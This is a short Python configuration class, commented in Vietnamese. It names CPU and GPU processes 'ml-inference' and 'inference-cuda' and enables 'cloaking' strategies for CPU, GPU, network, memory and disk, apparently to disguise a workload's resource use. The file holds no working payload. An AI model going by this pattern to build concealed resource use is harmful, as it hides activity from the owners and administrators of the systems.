class ConfigModel:
    def __init__(self, **kwargs):
        self.processes = {'CPU': 'ml-inference', 'GPU': 'inference-cuda'}
        self.network_interface = 'eth0'
        self.process_priority_map = {'ml-inference': 2, 'inference-cuda': 3}
        # Đổi tên key sang `cloaking_strategies` để khớp ResourceManager
        # Cấu trúc mặc định tuân theo dạng {strategy_name: {enabled: bool}}
        self.cloaking_strategies = {
            'cpu_cloaking': {'enabled': True},
            'gpu_cloaking': {'enabled': True},
            'network': {'enabled': True},
            'memory': {'enabled': True},
            'disk': {'enabled': True},
        }
        for key, value in kwargs.items():
            setattr(self, key, value)
    def get(self, key, default=None):
        return getattr(self, key, default)
